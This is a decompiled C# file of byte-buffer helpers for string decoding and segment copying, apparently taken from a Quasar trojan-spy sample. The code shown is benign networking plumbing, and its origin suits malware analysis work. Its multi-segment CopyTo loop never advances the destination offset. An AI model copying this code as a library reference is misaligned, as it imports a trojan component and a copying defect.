// Decompiled with JetBrains decompiler
// Type: NoiseMe.Drags.App.Models.SuperSocket.ProtoBase.Extensions
// Assembly: Stubv2.0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E945C042-2241-44AF-B826-4AD3FC72B170
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Quasar.gen-a3f98ee0a78f039e0a9ea52dba13c713dc46f749512bd7d108cc9c05f57fc93d.exe

using NoiseMe.Drags.App.Models.Delegates;
using System;
using System.Collections.Generic;
using System.Text;

namespace NoiseMe.Drags.App.Models.SuperSocket.ProtoBase
{
  public static class Extensions
  {
    public static string GetString(this Encoding encoding, IList<ArraySegment<byte>> data)
    {
      int byteCount = data.Sum<ArraySegment<byte>>((Func<ArraySegment<byte>, int>) (x => x.Count));
      char[] chars = new char[encoding.GetMaxCharCount(byteCount)];
      Decoder decoder = encoding.GetDecoder();
      int num1 = 0;
      int num2 = data.Count - 1;
      int bytesUsed = 0;
      int charsUsed = 0;
      bool completed = false;
      for (int index = 0; index < data.Count; ++index)
      {
        ArraySegment<byte> arraySegment = data[index];
        decoder.Convert(arraySegment.Array, arraySegment.Offset, arraySegment.Count, chars, num1, chars.Length - num1, index == num2, out bytesUsed, out charsUsed, out completed);
        num1 += charsUsed;
      }
      return new string(chars, 0, num1);
    }

    public static string GetString(
      this Encoding encoding,
      IList<ArraySegment<byte>> data,
      int offset,
      int length)
    {
      char[] chars = new char[encoding.GetMaxCharCount(length)];
      Decoder decoder = encoding.GetDecoder();
      int num1 = 0;
      int num2 = 0;
      int bytesUsed = 0;
      int charsUsed = 0;
      bool completed = false;
      int num3 = 0;
      for (int index = 0; index < data.Count; ++index)
      {
        ArraySegment<byte> arraySegment = data[index];
        int offset1 = arraySegment.Offset;
        int byteCount = arraySegment.Count;
        bool flush = false;
        if (num2 == 0)
        {
          int num4 = num3 + arraySegment.Count - 1;
          if (offset > num4)
          {
            num3 = num4 + 1;
            continue;
          }
          int num5 = offset - num3;
          offset1 += num5;
          byteCount -= num5;
          if (byteCount >= length)
          {
            byteCount = length;
            flush = true;
          }
        }
        else
        {
          int num6 = length - num2;
          if (num6 <= byteCount)
          {
            byteCount = num6;
            flush = true;
          }
        }
        decoder.Convert(arraySegment.Array, offset1, byteCount, chars, num1, chars.Length - num1, flush, out bytesUsed, out charsUsed, out completed);
        num1 += charsUsed;
        num2 += bytesUsed;
      }
      return new string(chars, 0, num1);
    }

    public static BufferStream GetBufferStream<TPackageInfo>(
      this IReceiveFilter<TPackageInfo> receiveFilter,
      IList<ArraySegment<byte>> data)
      where TPackageInfo : IPackageInfo
    {
      return receiveFilter.GetBufferStream<BufferStream, TPackageInfo>(data);
    }

    public static BufferStream GetBufferStream<TStream, TPackageInfo>(
      this IReceiveFilter<TPackageInfo> receiveFilter,
      IList<ArraySegment<byte>> data)
      where TStream : BufferStream, new()
      where TPackageInfo : IPackageInfo
    {
      BufferStream current = BufferStream.GetCurrent<BufferStream>();
      current.Initialize(data);
      return current;
    }

    public static void CopyTo(this IList<ArraySegment<byte>> packageData, ArraySegment<byte> data) => packageData.CopyTo(data, 0, data.Count);

    public static void CopyTo(
      this IList<ArraySegment<byte>> packageData,
      ArraySegment<byte> data,
      int srcOffset,
      int length)
    {
      int sourceIndex = srcOffset;
      int val1 = length;
      for (int index = 0; index < packageData.Count; ++index)
      {
        ArraySegment<byte> arraySegment = packageData[index];
        if (arraySegment.Count <= sourceIndex)
        {
          sourceIndex -= arraySegment.Count;
        }
        else
        {
          int length1 = Math.Min(val1, arraySegment.Count - sourceIndex);
          Array.Copy((Array) arraySegment.Array, sourceIndex, (Array) data.Array, data.Offset, length1);
          val1 -= length1;
          if (val1 <= 0)
            break;
        }
      }
    }
  }
}
